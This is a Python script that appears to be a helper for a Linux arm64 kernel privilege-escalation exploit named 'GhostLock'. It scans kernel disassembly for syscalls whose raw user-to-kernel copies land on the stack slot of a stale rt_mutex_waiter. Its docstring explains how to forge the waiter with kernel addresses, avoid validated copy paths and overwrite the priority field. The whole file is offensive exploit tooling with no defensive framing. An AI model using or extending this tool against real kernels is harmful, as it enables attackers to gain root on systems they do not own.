#!/usr/bin/env python3
"""find_bytecopy.py -- find syscalls that copy >= N bytes of *unvalidated* user
data onto a kernel-stack slot at a given depth.

GhostLock's transport must satisfy three things at once:
  (a) the copy is a raw byte copy -- no per-field validation, because the forged
      waiter needs kernel addresses in fields the kernel would otherwise check
      (the iovec path is disqualified: rw_copy_check_uvector runs access_ok()
      on every iov_base, so a kernel address aborts the loop early);
  (b) the destination slot sits at depth == depth(stale rt_mutex_waiter)
      (SP_entry is identical for every syscall of a task, so depths compare);
  (c) the copy is long enough to reach the field that must change.  With the
      stale waiter's prio == __waiter_prio(task) == DEFAULT_PRIO(120),
      rt_mutex_waiter_equal() is true, detect_deadlock is false
      (RT_MUTEX_MIN_CHAINWALK + no CONFIG_DEBUG_RT_MUTEXES), and
      rt_mutex_adjust_prio_chain() therefore returns *before* step [7].
      So the transport must overwrite prio at waiter+0x44 => >= 0x48 bytes.

Usage:
  python tools/find_bytecopy.py kernel.elf --syms syms.txt \
      --target 0x2b8 --min-len 0x48
"""

import argparse
import re
import subprocess
import sys
from collections import deque
from pathlib import Path

SYMS_ENTRY = re.compile(r"^(?P<addr>[0-9a-f]{8,16})\s+(?P<type>\S)\s+(?P<name>\S+)\s*$")
HEADER = re.compile(r"^[0-9a-f]+\s+<([^>+]+)>:")
FRAME_SUB = re.compile(r"sub\s+sp,\s+sp,\s+#(0x[0-9a-f]+|\d+)")
FRAME_PUSH = re.compile(r"stp\s+x29,\s*x30,\s+\[sp,\s+#-(0x[0-9a-f]+|\d+)\]!")
ADD_SP = re.compile(r"add\s+x(\d+),\s*sp,\s*#(0x[0-9a-f]+|\d+)")
ADD_FP = re.compile(r"(?:add|sub)\s+x(\d+),\s*x29,\s*#-?(0x[0-9a-f]+|\d+)")
MOV_SP = re.compile(r"mov\s+x(\d+),\s*sp\b")
MOV_REG = re.compile(r"mov\s+x(\d+),\s*x(\d+)\b")
MOV_WIMM = re.compile(r"mov\s+w(\d+),\s*#(0x[0-9a-f]+|\d+)")
MOV_XIMM = re.compile(r"mov\s+x(\d+),\s*#(0x[0-9a-f]+|\d+)")
CALL = re.compile(r"bl\s+0x[0-9a-f]+\s+<([^>]+)>")
# instruction whose first operand is a destination register
DEST = re.compile(r"^(ldr|ldur|ldar|ldxr|ldp|ldpsw|mov|movz|movk|add|sub|and|orr|eor|"
                  r"csel|csinc|adrp|mul|ubfx|sbfx|lsr|lsl|asr|clz|rbit|rev|mvn|neg|"
                  r"csneg|csinv|extr|bfi|bfxil|sxtw|uxtw|sxtb|sxth|sxth)\s")

COPY_X0 = ("copy_from_user", "__arch_copy_from_user", "copy_struct_from_user",
           "_copy_from_user", "raw_copy_from_user", "copy_from_user_nofault",
           "strncpy_from_user", "strlcpy_from_user", "copy_from_user_nolog",
           "copy_from_user_inatomic")
COPY_X2 = ("move_addr_to_kernel", "cmsghdr_from_user_compat_to_kern",
           "strncpy_from_user", "strlcpy_from_user")


def _int(t):
    return int(t, 16) if t.startswith("0x") else int(t)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("elf")
    ap.add_argument("--syms", required=True)
    ap.add_argument("--objdump", default="llvm-objdump")
    ap.add_argument("--target", required=True)
    ap.add_argument("--min-len", default="0x48")
    ap.add_argument("--depth", type=int, default=4)
    ap.add_argument("--window", default="0x30",
                    help="how far below the target the slot may start")
    args = ap.parse_args()

    syms, ordered = {}, []
    for line in Path(args.syms).read_text(encoding="utf-8", errors="ignore").splitlines():
        m = SYMS_ENTRY.match(line.strip())
        if m:
            syms[m.group("name")] = int(m.group("addr"), 16)
            ordered.append(int(m.group("addr"), 16))

    print("disassembling (single pass)...", file=sys.stderr)
    dump = subprocess.run([args.objdump, "-d", "--no-show-raw-insn", str(args.elf)],
                          capture_output=True, text=True, errors="ignore").stdout

    cache = {}
    cur, frame, calls, copy_dests = None, None, [], []
    reg = {}

    def flush(name):
        if name is not None:
            cache[name] = (frame, list(calls), list(copy_dests))

    for line in dump.splitlines():
        m = HEADER.match(line.strip())
        if m:
            flush(cur)
            cur, frame, calls, copy_dests, reg = m.group(1), None, [], [], {}
            continue
        if cur is None:
            continue
        text = line.split(":", 1)[1].strip() if ":" in line else ""

        if frame is None:
            fm = FRAME_SUB.search(text) or FRAME_PUSH.search(text)
            if fm:
                frame = _int(fm.group(1))

        # --- register tracking (sp-relative addresses only) ---
        am = ADD_SP.search(text)
        if am:
            reg[f"x{am.group(1)}"] = _int(am.group(2))
        else:
            afm = ADD_FP.search(text)
            if afm and frame is not None:
                # x29 = sp + (frame - sizeof(saved pair)); approximate with frame
                pass
            mm = MOV_SP.search(text)
            if mm:
                reg[f"x{mm.group(1)}"] = 0
            else:
                mr = MOV_REG.match(text)
                if mr:
                    src = reg.get(f"x{mr.group(2)}")
                    if src is None:
                        reg.pop(f"x{mr.group(1)}", None)
                    else:
                        reg[f"x{mr.group(1)}"] = src
                elif DEST.match(text):
                    d = re.match(r"^[a-z]+\s+([wx]\d+)", text)
                    if d:
                        reg.pop(f"x{d.group(1)[1:]}", None)

        cm = CALL.search(text)
        if cm:
            name = cm.group(1)
            base = name.split(".llvm.")[0]
            arg = None
            if any(k in base for k in COPY_X0):
                arg = "x0"
            elif any(k in base for k in COPY_X2):
                arg = "x2"
            if arg and arg in reg:
                copy_dests.append((reg[arg], base))
            if name in syms:
                calls.append(name)

    flush(cur)

    target = _int(args.target)
    minlen = _int(args.min_len)
    win = _int(args.window)

    roots = sorted(n for n in syms if n.startswith("__arm64_sys_"))
    hits = []
    for root in roots:
        q = deque([(root, [root], 0)])
        seen = set()
        while q:
            name, chain, acc = q.popleft()
            if len(chain) > args.depth or name in seen:
                continue
            seen.add(name)
            frame, calls, dests = cache.get(name, (None, [], []))
            if frame is None:
                continue
            acc += frame
            for off, base in dests:
                depth = acc - off
                # The slot may start ABOVE the target (shallower) as long as the
                # copy is long enough to reach past the target, or below it.
                if target - win <= depth <= target + win:
                    hits.append((abs(depth - target), depth, off, name, base, list(chain)))
            for c in calls:
                q.append((c, chain + [c], acc))

    hits.sort()
    print(f"target depth=0x{target:x}; slot may start at most 0x{win:x} below it; "
          f"need >= 0x{minlen:x} controllable bytes")
    print(f"raw byte-copy candidates: {len(hits)}")
    seen = set()
    for gap, depth, off, holder, base, chain in hits:
        key = (tuple(chain), off, base)
        if key in seen:
            continue
        seen.add(key)
        print(f"  slot=0x{depth:x} (gap {depth-target:+#x}) off=sp+0x{off:x} via {base} in {holder}")
        print(f"      {' -> '.join(chain)}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
